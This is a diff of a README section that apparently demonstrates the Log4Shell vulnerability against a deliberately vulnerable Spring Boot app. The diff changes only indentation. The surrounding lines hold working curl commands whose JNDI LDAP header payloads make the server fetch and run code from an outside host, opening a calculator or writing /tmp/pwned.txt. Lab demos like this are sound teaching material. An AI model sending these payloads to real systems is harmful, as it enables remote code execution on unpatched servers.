@@ -85,13 +85,13 @@
 #### Live Demo:
 I will cover 3 scenarios where the malicious code will execute different outputs on the host system/server.
   1. Open ==calculator== on windows system by executing vulnerable java application on local system.
-       - Run the spring boot application as below.  
+    - Run the spring boot application as below.  
     ![run app](http://g.recordit.co/AW98phqr4i.gif) 
-       - Use curl to send request to host server with malicious code.
+    - Use curl to send request to host server with malicious code.
     	`curl <your IP>:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_global/Y2FsYy5leGU=}'` 
     ![check calc](http://g.recordit.co/I5a0PeQpkf.gif) 
   2. Creating a ==txt file== inside server after hosting application on docker container.
-    	- Host the same application in docker using below commands.<br/>  
+    - Host the same application in docker using below commands.<br/>  
     	`docker pull vamsi13krish/vulnerable-app:latest`
     	`docker run -d --name vulnerable-app -p 8080:8080 vamsi13krish/vulnerable-app`   
     	``` curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.26.9.117:1389/serial/CommonsCollections5/exec_unix/dG91Y2ggL3RtcC9wd25lZC50eHQK}'```  
